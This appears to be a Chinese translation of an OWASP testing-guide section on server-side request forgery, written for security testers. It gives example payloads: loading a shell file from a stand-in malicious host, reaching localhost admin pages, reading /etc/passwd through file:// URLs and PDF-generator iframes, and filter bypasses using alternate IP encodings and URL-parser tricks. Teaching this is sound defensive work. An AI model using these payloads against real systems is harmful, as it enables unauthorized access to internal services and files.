# 测试服务器端请求伪造

|ID          |
|------------|
|WSTG-INPV-19|

## 概述

Web 应用程序经常与内部或外部资源交互。虽然您可能期望只有预期的资源会处理您发送的数据，但处理不当的数据可能会造成注入攻击的可能性。一种注入攻击类型称为服务器端请求伪造（SSRF）。成功的 SSRF 攻击可以授予攻击者访问受限操作、内部服务或应用程序或组织内部文件的权限。在某些情况下，甚至可能导致远程代码执行（RCE）。

## 测试目标

- 识别 SSRF 注入点。
- 测试注入点是否可利用。
- 评估漏洞的严重性。

## 如何测试

在测试 SSRF 时，您试图使目标服务器无意中加载或保存可能具有恶意内容的内容。最常见的测试是本地和远程文件包含。SSRF 还有另一个方面：应用程序服务器能够与用户无法直接访问的其他后端系统交互时，通常会产生信任关系。这些后端系统通常具有不可路由的私有 IP 地址或仅限于某些主机。由于它们受网络拓扑保护，通常缺乏更复杂的控制。这些内部系统通常包含敏感数据或功能。

考虑以下请求：

```http
GET https://example.com/page?page=about.php
```

您可以使用以下负载测试此请求。

### 加载文件内容

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### 访问受限页面

```http
GET https://example.com/page?page=http://localhost/admin
```

或：

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

使用环回接口访问仅限于主机的受限内容。此机制意味着，如果您有权访问主机，则您也拥有直接访问 `admin` 页面的权限。

这种信任关系，即源自本地机器的请求与普通请求的处理方式不同，通常是使 SSRF 成为严重漏洞的原因。

### 获取本地文件

```http
GET https://example.com/page?page=file:///etc/passwd
```

### 使用的 HTTP 方法

上述所有负载都可以应用于任何类型的 HTTP 请求，也可以注入到头部和 cookie 值中。

关于 POST 请求的 SSRF 的一个重要注意事项是，SSRF 也可能以盲注形式表现，因为应用程序可能不会立即返回任何内容。相反，注入的数据可能用于其他功能，如 PDF 报告、发票或订单处理等，这些功能可能对员工或工作人员可见，但不一定对最终用户或测试人员可见。

您可以在[此处](https://portswigger.net/web-security/ssrf/blind)或[参考资料部分](#references)找到更多关于盲 SSRF 的信息。

### PDF 生成器

在某些情况下，服务器可能会将上传的文件转换为 PDF 格式。尝试注入指向内部服务的 `<iframe>`、`<img>`、`<base>` 或 `<script>` 元素，或 CSS `url()` 函数。

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### 常见过滤器绕过

某些应用程序会阻止对 `localhost` 和 `127.0.0.1` 的引用。这可以通过以下方式绕过：

- 使用解析为 `127.0.0.1` 的替代 IP 表示：
    - 十进制表示：`2130706433`
    - 八进制表示：`017700000001`
    - IP 缩写：`127.1`
- 字符串混淆
- 注册解析为 `127.0.0.1` 的自己的域

有时应用程序允许输入匹配特定表达式（如域名）。如果 URL 模式解析器未正确实现，则可以通过类似[语义攻击](https://tools.ietf.org/html/rfc3986#section-7.6)的方式绕过。

- 使用 `@` 字符分隔用户信息和主机：`https://expected-domain@attacker-domain`
- 使用 `#` 字符进行 URL 分段：`https://attacker-domain#expected-domain`
- URL 编码
- 模糊测试
- 上述所有方法的组合

有关其他负载和绕过技术，请参见[参考资料](#references)部分。

## 修复

SSRF 被认为是最难防御的攻击之一，除非使用白名单来允许特定的 IP 和 URL。有关 SSRF 预防的更多信息，请阅读[服务器端请求伪造防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)。
